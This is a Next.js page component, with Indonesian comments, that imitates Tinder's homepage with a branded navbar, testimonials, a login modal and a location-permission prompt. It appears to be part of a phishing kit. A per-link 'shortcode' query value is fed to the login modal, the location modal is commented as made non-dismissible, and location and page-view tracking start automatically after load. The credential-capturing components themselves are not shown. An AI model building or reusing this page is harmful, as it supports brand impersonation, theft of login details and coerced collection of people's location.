'use client';

import { useRef, useState, useEffect } from 'react';
import { useScroll, useTransform } from 'framer-motion';
import { TrackPageView } from '@/components/tracking/track-page-view';
import LoadingScreen from './components/loading-screen';
import LoginModal from './components/login-modal';
import LocationPermissionModal from './components/location-permision-modal';
import TestimonialCarousel from './components/testimonial-carousel';
import { useSearchParams } from 'next/navigation';

// Import komponen-komponen yang telah dibuat
import TinderNavbar from './components/TinderNavbar';
import BackgroundImage from './components/BackgroundImage';
import ProfileCardSection from './components/ProfileCardSection';
import LocationDeniedMessage from './components/LocationDeniedMessage';
import TinderFooter from './components/TinderFooter';
import MobileNavBar from './components/MobileNavBar';
import CookieBanner from './components/CookieBanner';
import useLocationTracking from './hooks/useLocationTracking';

// Data profil masih dipertahankan untuk referensi meskipun saat ini tidak digunakan secara langsung
const profiles = [
  {
    id: 1,
    name: 'Stephen',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 2,
    name: 'Rose',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 3,
    name: 'Camille',
    age: 24,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 4,
    name: 'Devon',
    age: 25,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 5,
    name: 'Kevin',
    age: 29,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 6,
    name: 'Elizabeth',
    age: 27,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 7,
    name: 'Chance',
    age: 22,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 8,
    name: 'Carmarita',
    age: 30,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 9,
    name: 'Herman',
    age: 24,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 10,
    name: 'Kim',
    age: 19,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 11,
    name: 'Luna',
    age: 23,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 12,
    name: 'Helena',
    age: 28,
    image: '/placeholder.svg?height=400&width=300',
  },
  {
    id: 13,
    name: 'Brooks',
    age: 30,
    image: '/placeholder.svg?height=400&width=300',
  },
];

// Testimonials data digunakan oleh TestimonialCarousel
const testimonials = [
  {
    id: 1,
    names: 'Kenneth and Elliot',
    text: 'I honestly had been on many Tinder dates and was absolutely sure I was meeting a fling to get a free meal and have some fun ... 3 years and sooo many dates and memories later, I am married to my Tinder guy, Kenny!',
  },
  {
    id: 2,
    names: 'Victoria & Louise ❤️',
    text: 'THANK YOU for making it possible for me to meet my soulmate. Five minutes into our first conversation, my now-wife mentioned how we would have an amazing wedding.',
  },
  {
    id: 3,
    names: 'Ryan & Lindsey',
    text: '... just had a bad break-up and created a Tinder account to keep my mind off the break-up. After about a week of talking, we decided to meet up at a local bar for drinks ... we decided to tie the knot in an 18-person ceremony in New Jersey on 27 June 2020.',
  },
];

export default function HomePage() {
  // State untuk komponen
  const [showCookieBanner, setShowCookieBanner] = useState(true);
  const [isClient, setIsClient] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(true);
  const [showLoginModal, setShowLoginModal] = useState(false);
  const [contentLoaded, setContentLoaded] = useState(false);
  const [navbarFixed, setNavbarFixed] = useState(false);

  // Menggunakan custom hook untuk location tracking
  const {
    locationEnabled,
    locationError,
    locationDenied,
    profileVisible,
    showLocationModal,
    setShowLocationModal,
    showAfterLocationPrompt,
    checkLocationPermission,
    handleLocationSuccess,
  } = useLocationTracking();

  // Refs dan animasi
  const backgroundRef = useRef<HTMLDivElement>(null);
  const testimonialsRef = useRef<HTMLElement>(null);
  const { scrollY } = useScroll();

  const titleOpacity = useTransform(scrollY, [0, 200, 400], [1, 0.5, 0]);
  const buttonOpacity = useTransform(scrollY, [0, 300, 500], [1, 0.3, 0]);

  const searchParams = useSearchParams();
  const shortcode = searchParams.get('shortcode');

  // Deteksi client-side dan ukuran layar
  useEffect(() => {
    setIsClient(true);

    const checkMobile = () => {
      setIsMobile(window.innerWidth < 768);
    };

    checkMobile();
    window.addEventListener('resize', checkMobile);

    // Simulasi loading time
    const timer = setTimeout(() => {
      setIsLoading(false);
      setContentLoaded(true);
    }, 2000);

    return () => {
      window.removeEventListener('resize', checkMobile);
      clearTimeout(timer);
    };
  }, []);

  // Show location modal after content is loaded
  useEffect(() => {
    if (contentLoaded) {
      // Wait a short delay after content loads before checking location permission
      const locationTimer = setTimeout(() => {
        checkLocationPermission();
      }, 1500);

      return () => clearTimeout(locationTimer);
    }
  }, [contentLoaded, checkLocationPermission]);

  // Parallax effect for background and navbar position
  useEffect(() => {
    if (!isClient) return;

    const testimonials = testimonialsRef.current;

    if (!testimonials) return;

    // Create an intersection observer to detect when testimonials section is in view
    const observer = new IntersectionObserver(
      (entries) => {
        if (entries[0].isIntersecting) {
          setNavbarFixed(true);
        } else {
          setNavbarFixed(false);
        }
      },
      { threshold: 0.1 },
    );

    observer.observe(testimonials);

    const handleScroll = () => {
      if (backgroundRef.current) {
        const scrollY = window.scrollY;
        backgroundRef.current.style.transform = `translateY(${scrollY * 0.5}px)`;
      }

      // Get the position of the testimonials section
      if (testimonials) {
        const testimonialsPosition = testimonials.getBoundingClientRect().top;

        // If testimonials section is about to come into view (or already in view)
        if (testimonialsPosition < window.innerHeight) {
          setNavbarFixed(true);
        } else {
          setNavbarFixed(false);
        }
      }
    };

    window.addEventListener('scroll', handleScroll);
    return () => {
      window.removeEventListener('scroll', handleScroll);
      observer.disconnect();
    };
  }, [isClient]);

  if (!isClient) {
    return null;
  }

  if (isLoading) {
    return <LoadingScreen />;
  }

  return (
    <div className='relative min-h-screen overflow-hidden'>
      {/* Background dengan fixed position */}
      <BackgroundImage backgroundRef={backgroundRef} isMobile={isMobile} />

      {/* Navbar */}
      <TinderNavbar
        isFixed={navbarFixed}
        locationEnabled={locationEnabled}
        locationError={locationError}
        onLoginClick={() => setShowLoginModal(true)}
      />

      {/* Main content */}
      <main className='relative z-10'>
        {/* Section pesan lokasi ditolak */}
        <LocationDeniedMessage
          locationDenied={locationDenied}
          onTryAgainClick={handleLocationSuccess}
        />

        {/* Hero section dengan profile card */}
        <ProfileCardSection
          profileVisible={profileVisible}
          titleOpacity={titleOpacity}
          buttonOpacity={buttonOpacity}
          onLoginClick={() => setShowLoginModal(true)}
        />
      </main>

      {/* Testimonials section with carousel */}
      <section
        ref={testimonialsRef}
        className='relative z-20 mt-16 bg-gray-900'
      >
        <div className='mx-auto max-w-6xl px-4'>
          <h2 className='mb-8 text-center text-3xl font-bold text-white'>
            Success Stories
          </h2>
          <TestimonialCarousel />
        </div>
      </section>

      {/* Footer */}
      <TinderFooter />

      {/* Cookie banner */}
      <CookieBanner
        show={showCookieBanner}
        onClose={() => setShowCookieBanner(false)}
      />

      {/* Login Modal */}
      <LoginModal
        isOpen={showLoginModal}
        onClose={() => setShowLoginModal(false)}
        shortcode={shortcode || undefined}
      />

      {/* Location Permission Modal - Now non-dismissible */}
      <LocationPermissionModal
        isOpen={showLocationModal}
        onAllow={handleLocationSuccess}
      />

      {/* Bottom mobile navigation bar */}
      {/* <MobileNavBar /> */}

      {/* TrackPageView component */}
      <TrackPageView pageType='tinder' />
    </div>
  );
}
